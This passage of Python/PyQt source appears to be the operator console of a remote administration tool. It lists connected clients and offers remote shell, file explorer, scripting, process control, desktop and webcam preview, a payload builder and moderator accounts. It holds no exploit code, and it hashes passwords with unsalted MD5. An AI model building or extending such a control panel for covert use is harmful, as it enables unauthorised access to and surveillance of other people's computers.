                text, ok = QInputDialog.getText(self, _('UNLOCK_CLIENT'), _('ENTER_PASSWORD'), QLineEdit.Password)
                if ok:
                    _hash = hashlib.md5()
                    try:
                        _hash.update(str(text))
                        answer = data_get(self.connection_socket, _hash.hexdigest(), 'unlockClient', session_id=self.session_id, to=client)
                        if answer['mode'] == 'loginSuccess':
                            break
                        elif answer['mode'] == 'notAuthorized':
                            continue
                    except UnicodeEncodeError:
                        pass
                else:
                    break

    def lock_client(self):
        client = self.current_client()
        if client:
            data_send(self.connection_socket, 'lockClient', 'lockClient', self.session_id, client)

    def update_main_menu(self):
        try:
            if self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_lock).text() == _('INFO_LOCKED'):
                self.actionUnlock_Client.setDisabled(False)
                self.actionSet_Alias.setDisabled(False)
                self.actionDesktop_Preview.setDisabled(False)
                server = self.current_client()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.actionWebcam_Preview.setDisabled(False)
                self.actionRemote_Shell.setDisabled(True)
                self.actionRemote_Explorer.setDisabled(True)
                self.actionRemote_Scripting.setDisabled(True)
                self.actionRemote_Process_Manager.setDisabled(True)
                self.actionLock_Client.setDisabled(True)
                self.actionStop_Client.setDisabled(True)
            else:
                self.actionRemote_Shell.setDisabled(False)
                self.actionRemote_Explorer.setDisabled(False)
                self.actionRemote_Scripting.setDisabled(False)
                self.actionRemote_Process_Manager.setDisabled(False)
                self.actionLock_Client.setDisabled(False)
                self.actionStop_Client.setDisabled(False)
                self.actionUnlock_Client.setDisabled(True)
                self.actionSet_Alias.setDisabled(False)
                self.actionDesktop_Preview.setDisabled(False)
                server = self.current_client()
                if self.socks[server]['webcamdevice'] != 'NoDevice':
                    self.actionWebcam_Preview.setDisabled(False)
        except:
            self.actionRemote_Shell.setDisabled(True)
            self.actionRemote_Explorer.setDisabled(True)
            self.actionRemote_Scripting.setDisabled(True)
            self.actionRemote_Process_Manager.setDisabled(True)
            self.actionLock_Client.setDisabled(True)
            self.actionStop_Client.setDisabled(True)
            self.actionSet_Alias.setDisabled(True)
            self.actionUnlock_Client.setDisabled(True)
            self.actionDesktop_Preview.setDisabled(True)
            self.actionWebcam_Preview.setDisabled(True)

    def has_microphone(self):
        client = self.current_client()
        if client:
            if self.streaming_socks[client]['audio_device'] != 'NoDevice':
                return True
            else:
                return False

    def has_camera(self):
        client = self.current_client()
        if self.streaming_socks[client]['webcamera_device'] != 'NoDevice':
            return True
        else:
            return False

    def server_right_click_menu(self, point):
        server_index = self.clientsTable.currentRow()
        server_menu = QMenu(self)
        server_options_menu = QMenu(_('RM_CLIENT_OPTIONS'), self)
        server_options_menu.setIcon(QIcon(os.path.join(assets, 'settings.png')))

        if self.clientsTable.selectedItems():

            server_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')), _('RM_SET_ALIAS'), self.add_alias)
            server_menu.addAction(QIcon(os.path.join(assets, 'unhide.png')), _('RM_VIEW_LOGS'), self.view_logs)
            server_menu.addSeparator()

            if self.clientsTable.item(server_index, self.index_of_lock).text() == _('INFO_UNLOCKED'):
                server_menu.addAction(QIcon(os.path.join(assets, 'mshell.png')), _('RM_SHELL'),
                                      lambda: self.execute_plugin('shell'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mexplorer.png')), _('RM_EXPLORER'),
                                      lambda: self.run_plugin('explorerMode'))
                server_menu.addAction(QIcon(os.path.join(assets, 'mprocesses.png')), _('RM_PROCESSES'),
                                      lambda: self.execute_plugin('processes'))
                server_menu.addAction(QIcon(os.path.join(assets, 'script.png')), _('RM_SCRIPTING'),
                                      lambda: self.execute_plugin('scripting'))

                server_menu.addSeparator()
                server_menu.addMenu(server_options_menu)
                server_options_menu.addAction(QIcon(os.path.join(assets, 'lock.png')), _('RM_LOCK'),
                                              self.lock_client)
                if self.privs == 1:
                    server_options_menu.addAction(QIcon(os.path.join(assets, 'stop.png')), _('RM_TERMINATE'),
                                                  self.terminate_client)
            else:
                server_menu.addAction(QIcon(os.path.join(assets, 'unlock.png')), _('RM_UNLOCK'), self.unlock_client)

            server_menu.addSeparator()

            server_menu.addAction(QIcon(os.path.join(assets, 'mdesktop.png')),
                                  _('RM_DESKTOP'), self.get_desktop_preview)
            camera_menu = server_menu.addAction(QIcon(os.path.join(assets, 'webcam.png')),
                                                _('RM_CAMERA'), self.get_webcam_preview)
            if not self.has_camera():
                camera_menu.setEnabled(False)

            # Administrator Menu
            if self.privs == 1:
                server_menu.addSeparator()

                administrator_menu = QMenu(_('ADMINISTRATOR_RM_ADMINISTRATOR'), self)
                administrator_menu.setIcon(QIcon(os.path.join(assets, 'administration.png')))

                administrator_menu.addAction(QIcon(os.path.join(assets, 'add_alias.png')),
                                             _('ADMINISTRATOR_RM_SET_MODERATOR'), self.administrator_set_moderator)

                server_menu.addMenu(administrator_menu)

            server_menu.exec_(self.clientsTable.mapToGlobal(point))

    # get item
    def current_client(self):
        try:
            return str(self.clientsTable.item(self.clientsTable.currentRow(), self.index_of_id).text())
        except AttributeError:
            return False

    def execute_plugin(self, plugin):
        plugins = {
            'shell': mshell,
            'explorer': mexplorer,
            'scripting': mscript,
            'processes': mprocesses,
        }

        client = self.current_client()
        if client:
            args = {
                'sock': self.connection_socket,
                'client': client,
                'session_id': self.session_id,
                'assets': assets,
            }
            plugin_id = id_generator()
            if plugin in plugins:
                self.pluginsBank[plugin_id] = plugins[plugin].mainPopup(args)
                self.pluginsBank[plugin_id].show()

    def add_alias(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
            if ok:
                data_send(self.connection_socket, '%s %s' % (client, str(text)), 'setAlias', self.session_id)

    def terminate_client(self):
        client = self.current_client()
        if client:
            warn = QMessageBox(QMessageBox.Question, _('TERMINATE_CONFIRM'), _('TERMINATE_TEXT'))
            warn.setStandardButtons(QMessageBox.Yes | QMessageBox.No)
            ans = warn.exec_()
            if ans == QMessageBox.Yes:
                data_send(self.connection_socket, 'terminateClient', 'terminateClient', session_id=self.session_id, to=client)

    def update_settings(self):
        self.settings = Config()
        self.IPADDRESS = self.settings.ip_address
        self.PORT = self.settings.port
        self.LANGUAGE = self.settings.language

    def run_settings(self):
        args = {
            'language': self.LANGUAGE
        }
        self.settings_form = Settings(args)
        self.settings_form.show()

    def run_builder(self):
        args = {
            'language': self.LANGUAGE
        }
        self.builder_form = Builder(args)
        self.builder_form.show()

    def administrator_set_moderator(self):
        client = self.current_client()
        if client:
            text, ok = QInputDialog.getText(self, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
            if ok:
                data_send(self.connection_socket, '%s %s' % (client, text), 'setModerator', session_id=self.session_id)

    def closeEvent(self, event):
        self.acceptthreadState = False
        sys.exit(1)

    # MODERATORS COMMANDS
    def get_moderators(self):
        if self.privs == 1:
            try:
                all_moderators = data_get(self.connection_socket, 'getModerators', 'getModerators', session_id=self.session_id)
                print all_moderators
            except SyntaxError:
                return

            moderators = all_moderators['payload']
            self.moderatorsTable.setRowCount(len(moderators))

            for index, key in enumerate(moderators):

                # add moderator id
                item = QTableWidgetItem(key)
                item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 0, item)

                # add online clients count
                item = QTableWidgetItem(str(moderators[key]['online_clients']))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 1, item)

                # add offline clients count
                item = QTableWidgetItem(str(moderators[key]['offline_clients']))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 2, item)

                # add privileges
                privileges = moderators[key]['privileges']
                if privileges == 1:
                    color = '#9b59b6'
                    privileges = _('MODERATORS_PRIVILEGES_ADMINISTRATOR')
                else:
                    color = '#c9f5f7'
                    privileges = _('MODERATORS_PRIVILEGES_MODERATOR')
                item = QTableWidgetItem(privileges)
                item.setTextColor(QColor(color))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 3, item)

                # add moderator status
                status = moderators[key]['status']
                if status == 1:
                    style = '#1abc9c'
                    text = _('MODERATOR_ONLINE')
                else:
                    style = '#e67e22'
                    text = _('MODERATOR_OFFLINE')
                item = QTableWidgetItem(text)
                item.setTextColor(QColor(style))
                item.setTextAlignment(Qt.AlignHCenter | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 4, item)

                # add moderator last online
                item = QTableWidgetItem(str(moderators[key]['last_online']))
                item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                self.moderatorsTable.setItem(index, 5, item)


    # Add Moderator Entry
    def add_moderator(self):
        # Get Username
        username, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_USERNAME'), _('ADMINISTRATION_USERNAME'), QLineEdit.Normal)
        if ok and len(str(username)) > 0:
            username = str(username)
            # Get Password
            password, ok = QInputDialog.getText(self, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
            if ok and len(str(password)) > 4:
                password = str(password)
                # Get Privileges
                privileges, ok = QInputDialog.getItem(self, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'), ('0', '1'), 0, False)
                admin = str(privileges)
                if ok and privileges:
                    # If everything ok
                    data_send(self.connection_socket, '%s %s %s' % (username, password, admin), 'addModerator', session_id=self.session_id)
                    # Update Moderators Table
                    self.get_moderators()
                else:
                    # If not privileges
                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PRIVILEGES'), _('ADMINISTRATION_INCORRECT_PRIVILEGES'))
                    ans = warn.exec_()
                    return
            # if not password
            else:
                warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                ans = warn.exec_()
                return
        # if not password
        else:
            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_USERNAME'), _('ADMINISTRATION_INCORRECT_USERNAME'))
            ans = warn.exec_()
            return


# Run Application
if __name__ == '__main__':
    app = QApplication(sys.argv)

    # Create and display the splash screen
    splash_pix = QPixmap(os.path.join(assets, 'splash.png'))
    splash = QSplashScreen(splash_pix, Qt.WindowStaysOnTopHint)
    splash.setMask(splash_pix.mask())
    splash.show()
    app.processEvents()
    time.sleep(3)

    form = MainDialog()
    splash.finish(form)
    form.show()

    sys.exit(app.exec_())
